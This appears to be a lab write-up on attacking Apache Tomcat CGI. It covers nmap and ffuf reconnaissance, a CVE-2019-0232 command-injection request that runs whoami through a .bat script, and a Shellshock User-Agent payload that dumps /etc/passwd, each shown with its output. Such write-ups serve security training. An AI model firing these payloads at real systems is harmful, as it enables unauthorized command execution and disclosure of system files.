# Attacking Tomcat CGI

## Nmap

```sh
my@attack:~$ sudo nmap 10.129.205.30 -p- --open -Pn -sC
```

```output title="Output" hl_lines="19"
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-09 02:42 +03
Nmap scan report for 10.129.205.30
Host is up (0.15s latency).
Not shown: 63185 closed tcp ports (reset), 2336 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey:
|   2048 ae:19:ae:07:ef:79:b7:90:5f:1a:7b:8d:42:d5:60:99 (RSA)
|   256 38:2e:76:cd:05:94:a6:e7:17:d1:80:81:65:26:25:44 (ECDSA)
|_  256 35:09:69:12:23:0f:11:bc:54:6f:dd:f7:97:bd:61:50 (ED25519)
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
8009/tcp  open  ajp13
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp  open  http-proxy
|_http-favicon: Apache Tomcat
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: -4s
| smb2-time:
|   date: 2025-05-08T23:43:35
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 157.44 seconds
```

## Fuzzing CGI Script (CMD)

```sh
my@attack:~$ ffuf -ic -w /usr/local/share/wordlists/dirb/common.txt:FUZZ -u "http://10.129.205.30:8080/cgi/FUZZ" -e .cmd
```

## Fuzzing CGI Script (BAT)

```sh
my@attack:~$ ffuf -ic -w /usr/local/share/wordlists/dirb/common.txt:FUZZ -u "http://10.129.205.30:8080/cgi/FUZZ" -e .bat
```

```output title="Output"
welcome.bat             [Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 181ms]
```

## [RCE](https://nvd.nist.gov/vuln/detail/cve-2019-0232)

```sh
my@attack:~$ curl -s 'http://10.129.205.30:8080/cgi/welcome.bat?&C%3A%5CWindows%5CSystem32%5Cwhoami.exe'
```

```output title="Output"
Welcome to CGI, this section is not functional yet. Please return to home page.
feldspar\omen
```

## [ShellShock](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

### Fuzzing

```sh
my@attack:~$ ffuf -ic -w /usr/local/share/wordlists/dirb/small.txt:FUZZ -u "http://10.129.205.27/cgi-bin/FUZZ" -e .cgi
```

```output title="Output"
access.cgi              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 171ms]
```

### Confirming

```sh
my@attack:~$ curl -s 'http://10.129.205.27/cgi-bin/access.cgi' -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd'
```

```linuxconfig title="Output"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
ftp:x:112:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
kim:x:1000:1000:,,,:/home/kim:/bin/bash
```
